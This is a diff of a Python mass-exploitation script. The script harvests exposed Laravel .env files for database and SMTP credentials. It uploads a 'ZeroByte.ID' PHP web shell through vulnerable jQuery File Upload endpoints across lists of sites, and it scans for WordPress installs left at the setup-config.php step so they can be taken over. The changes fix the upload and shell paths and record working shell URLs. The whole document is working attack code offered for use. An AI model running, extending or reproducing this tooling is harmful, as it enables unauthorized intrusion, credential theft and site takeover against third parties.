@@ -59,7 +59,7 @@ def LeNv():
 			else:
 				print "  DATABASE [OK]"
 				print "  SMTPS [OK]"
-				lw.write(r.urd + "\n")
+				lw.write(r.url + "\n")
 		else:
 			print(bcolors.MERAH + " [BAD] Laravel")
 
@@ -98,8 +98,8 @@ def jQu():
 	print bcolors.NORMAL
 	jd = raw_input("Input your domain full path: ")
 	r = requests.post("{}/index.php".format(jd), files=files)
-	r = requests.get("{}/files/zb-uploader.php".format(jd))
-	rjq = r.text
+	rc = requests.get("{}/files/zb-uploader.php".format(jd))
+	rjq = rc.text
 	if "ZeroByte.ID" in rjq:
 		print(bcolors.HIJAU + " [OK] Upload Done")
 		print " Your access shell : {}/files/zb-uploader.php".format(jd)
@@ -120,13 +120,15 @@ def jQuL():
 	js = open(jl, "r").read().split()
 	js.sort()
 	for site in js:
-		r = requests.get("{}/assets/plugins/jquery-file-upload/files/zb-uploader.php".format(js))
-		rjq = r.text
-		print rjq
+		print bcolors.NORMAL
+		print "Try it => {}".format(site)
+		r = requests.post("{}/assets/plugins/jquery-file-upload/server/php/index.php".format(site), files=files)
+		rc = requests.get("{}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site))
+		rjq = rc.text
 		if "ZeroByte.ID" in rjq:
 			print(bcolors.HIJAU + " [OK] Upload Done")
-			print " Your access shell : {}/assets/plugins/jquery-file-upload/files/zb-uploader.php".format(jd)
-			jw.write("{}/assets/plugins/jquery-file-upload/files/zb-uploader.php".format(jd))
+			print " Your access shell : {}/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php".format(site)
+			jw.write(site + "/assets/plugins/jquery-file-upload/server/php/files/zb-uploader.php\n")
 		else:
 			print(bcolors.MERAH + " [BAD] Upload Failed")
 def wPI():
@@ -140,19 +142,21 @@ def wPI():
 	wl = raw_input(" Input your file list : ")
 	ws = open(wl, "r").read().split()
 	ws.sort()
-	patchw = ["/wordpress/", "/wp/", "/test/", "/wptest/"]
-	i = 0
+	patchw = ["/wordpress/", "/wp/", "/test/", "/wptest/", "/new/", "/"]
 	for site in ws:
+		print bcolors.NORMAL
 		print "Try it => {}".format(site)
+		i = 0
 		while i < len(patchw):
-			r = requests.get("{}{}wp-admin/setup-config.php".format(site, patchw[i]), timeout=5)
+			r = requests.get("{}{}/wp-admin/setup-config.php?step=0".format(site, patchw[i]), timeout=5)
 			rwp = r.text
-			if "https://codex.wordpress.org/" in rwp:
+			if "setup-config.php?step=1" in rwp:
 				print(bcolors.HIJAU + " [OK] {}{}".format(site, patchw[i]))
-				ww.write("{}{}".format(site, patchw[i]))
+				ww.write("{}{}".format(site, patchw[i]) + "\n")
 			else:
 				print(bcolors.MERAH + " [BAD] {}{}".format(site, patchw[i]))
 			i += 1
+	print bcolors.NORMAL
 
 print " 1. LaraveL Environmet List [DB & SMTP]"
 print " 2. Reverse IP [API Hacker Target]"
